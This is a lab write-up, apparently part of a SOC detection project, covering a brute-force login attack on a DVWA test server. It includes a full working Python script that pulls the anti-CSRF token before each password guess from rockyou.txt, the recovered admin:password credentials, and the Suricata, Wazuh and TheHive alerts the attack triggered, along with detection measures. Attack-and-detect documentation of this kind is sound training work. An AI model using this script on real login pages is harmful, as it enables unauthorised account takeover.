# Stage 02 — Brute Force



> **Status:** Complete — evidence attached

> **Case:** [Case 01](../../04-Investigation/Cases/case-01-web-compromise.md)

> **Investigation:** [Phase 1 Deep Dive](../../04-Investigation/Deep-Dive-Attack-Chain-Investigation.md#phase-1-rattling-the-doorknobs-reconnaissance--web-exploitation)

> **Evidence:** [attack](../../06-Resources/screenshots/attack-simulation/6.png) · [alert](../../06-Resources/screenshots/thehive-alert/4.png)



## Objective



Obtain valid administrative credentials for the DVWA web application via an automated dictionary brute-force attack against `/login.php`, bypassing anti-CSRF token protection mechanisms.



## Commands



```bash

# 1. Author custom CSRF-handling brute-force automation script in Python

nano dvwa_bruteforce.py



# Script implementation:

cat << 'EOF' > dvwa_bruteforce.py

import requests

import re

import sys



target = "http://192.168.56.30/login.php"

username = "admin"

wordlist = "/usr/share/wordlists/rockyou.txt"



session = requests.Session()



def get_token():

    r = session.get(target)

    match = re.search(r"user_token'\s*value='([a-f0-9]+)'", r.text)

    return match.group(1) if match else None



def try_login(password):

    token = get_token()

    if not token:

        print("[!] Could not find token")

        return False

    data = {

        "username": username,

        "password": password,

        "Login": "Login",

        "user_token": token

    }

    r = session.post(target, data=data)

    if "Login failed" not in r.text:

        print(f"[+] SUCCESS: {username}:{password}")

        return True

    return False



with open(wordlist, "r", encoding="latin-1") as f:

    for line in f:

        password = line.strip()

        print(f"[*] Trying: {password}")

        if try_login(password):

            break

EOF



# 2. Execute brute-force attack against target portal

python dvwa_bruteforce.py

```



## What happened



1. **CSRF Challenge & Script Development**: Standard dictionary brute-forcing tools (such as Hydra or basic curl loops) failed against the DVWA authentication interface because every login request requires a dynamically generated `user_token` hidden field in the HTML form. To circumvent this, the attacker authored `dvwa_bruteforce.py` on Kali Linux (`192.168.232.135`).

2. **Session Maintenance & Dynamic Extraction**: The script maintains an active HTTP session via `requests.Session()`. Before dispatching each candidate password, it issues a GET request to `http://192.168.56.30/login.php`, extracts the active anti-CSRF token using regular expression parsing (`user_token'\s*value='([a-f0-9]+)'`), and injects it into the POST payload alongside `username=admin`.

3. **Execution & Credential Recovery**: The attacker executed the script against the target, iterating through candidate passwords from `/usr/share/wordlists/rockyou.txt`. After trying common passwords (`123456`, `12345`, `123456789`), the script tested the password `password`. The application accepted the authentication attempt, established an authenticated session, and omitted the "Login failed" string, resulting in the output `[+] SUCCESS: admin:password`.



## Evidence



### Attack Screenshots



![Custom DVWA CSRF-Aware Python Brute-Force Script](../../06-Resources/screenshots/attack-simulation/6.png)

*Figure 2.1: Custom Python brute-force script designed to parse user_token anti-CSRF values.*



![Brute-Force Script Execution and Credential Discovery](../../06-Resources/screenshots/attack-simulation/7.png)

*Figure 2.2: Execution output discovering valid administrative credentials (admin:password).*



### Alert Screenshots



![TheHive Alert Overview - Web Authentication Alerts](../../06-Resources/screenshots/thehive-alert/3.png)

*Figure 2.3: TheHive alert inbox displaying authentication requests and correlated web security telemetry on host dvwa.*



![TheHive Alert Details - Suricata Inbound Python-Requests User-Agent Alerts](../../06-Resources/screenshots/thehive-alert/4.png)

*Figure 2.4: Suricata rule 100600 / ET INFO python-requests inbound alert capturing automated brute force requests targeting /login.php.*



![TheHive Alert Detail - Python-Requests Automated Brute Force Session](../../06-Resources/screenshots/thehive-alert/4.1.png)

*Figure 2.5: Alert detail view showing high-frequency POST requests to /login.php from 192.168.232.135 (Alert wzb-6a22425401).*



## Alert observed



| Source | Rule / Signature | Rule ID | TheHive alert / Reference | Severity | Status |

|---|---|---|---|---|---|

| Suricata / Wazuh | `Suricata: [200] [192.168.232.135] [/login.php] [ET INFO User-Agent (python-requests) Inbound to Webserver]` | Custom Rule 100600 / Rule 100200 / SID 2017515 | `wzb-6a22425401` (`4.png`, `4.1.png`, `3.png`) | Medium (2) | **Detected** |

| Wazuh (Web Access) | High-frequency authentication attempts to `/login.php` | Rule 100200 | SIEM Indexed / TheHive Alert | Medium (2) | **Detected** |



## MITRE ATT&CK



| Tactic | Technique | ID |

|---|---|---|

| Credential Access | Brute Force: Password Guessing | T1110.001 |

| Credential Access | Brute Force: Credential Stuffing | T1110.004 |



## Detection opportunities



- **Authentication Failure Threshold Correlation**: Wazuh rules configured to monitor Apache access logs for consecutive POST requests to `/login.php` resulting in redirect responses (`302`) back to `/login.php` or HTTP 200 responses without session elevation, exceeding 5 attempts within 60 seconds.

- **Automated Script User-Agent Flagging**: Suricata and Wazuh signatures matching programmatic default User-Agents such as `python-requests/2.32.5`.

- **IP Reputation and Behavioral Throttling**: Implementing rate-limiting reverse proxies or tools such as Fail2ban to block IP addresses issuing high-frequency authentication attempts.

- **Multi-Factor Authentication (MFA) & Lockout Controls**: Enforcing account lockout policies and multi-factor authentication on administrative portals to thwart password guessing attacks.



## Notes



- The attack successfully extracted valid administrator credentials (`admin:password`).

- The surrounding scanning and probing generated a cascade of alerts across both Wazuh log decoders and Suricata network signatures, creating actionable alert clusters inside TheHive.

